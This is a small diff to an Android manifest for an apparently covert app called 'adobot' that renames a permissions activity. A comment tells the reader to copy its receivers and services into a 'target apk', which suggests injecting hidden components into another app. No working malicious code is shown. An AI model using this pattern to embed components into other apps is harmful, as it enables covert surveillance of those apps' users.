@@ -53,7 +53,7 @@
 
         <!--copy the receivers and services to the target apk source-->
         <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
-        <activity android:name="com.android.adobot.activities.AskPermissionsActivity"></activity>
+        <activity android:name="com.android.adobot.activities.PermissionsActivity"></activity>
 
         <receiver android:name="com.android.adobot.NetworkWatcher">
             <intent-filter>
